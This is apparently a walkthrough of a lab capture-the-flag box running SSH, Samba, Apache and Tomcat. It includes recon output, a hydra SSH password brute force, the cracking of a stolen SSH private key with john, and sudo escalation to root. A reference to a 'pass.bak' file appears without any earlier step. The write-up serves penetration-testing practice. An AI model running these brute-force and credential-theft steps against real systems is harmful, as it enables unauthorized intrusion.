# Recon

## NMAP

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)                                                                                                                                                
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)                                                                                                                                               
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)                                                                                                                                             
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                     
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                                  
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                          
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-10-10T18:03:20-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-10T22:03:21
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

## Gobuster
### http://10.10.207.108/

/development          (Status: 301) [Size: 320] [--> http://10.10.207.108/development/]



## Nikto
### http://10.10.207.108/




# Web

- Comment in the html source code:  ```Check our dev note section if you need to know what to work on. ```
- We have two files under /development, dev.txt and j.txt
- Dev.txt:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
- j.txt:
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
- We have a struct version 2.5.12
- We have a SMB
- We have an Apache running
- J has a really easy password

- Lets run enum4linux since this has a samba service running.
- WE found two users: 
```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
- Lets take the hint from the note and brute force jan password to the ssh service:

```
hydra -l jan -P ~/tools/seclists/Passwords/Common-Credentials/best1050.txt ssh://10.10.207.108 -t 4

[22][ssh] host: 10.10.207.108   login: jan   password: armando
```

- WE got a shell as Jan. Lets use linpeas to enumerate the machine
- Relevant information:
```
rwsr-xr-x 1 root root 2.4M Nov 24  2016 /usr/bin/vim.basic (Unknown SUID binary!)
/home/kay/.viminfo
/home/kay/.ssh/id_rsa


uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
uid=1001(jan) gid=1001(jan) groups=1001(jan)

dirtycow - high probable
```
- Lets use the private key that is in /home/kay/.ssh/ to login as kay
- We open a python server and request the id_rsa to our computer
- Since we dont have the password we will try to crack it with john
- ```ssh2john id_rsa > id_rsa.hash ```
- 
```
john --wordlist=~/tools/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash 
beeswax          (id_rsa) 
```
- The pass.bak in fact is the password for the kay user inside the system.
- ```heresareallystrongpasswordthatfollowsthepasswordpolicy$$```
- Doing ```sudo -l``` we get that we can run all commands as root ```(ALL : ALL) ALL```
- ```sudo su``` and we got root
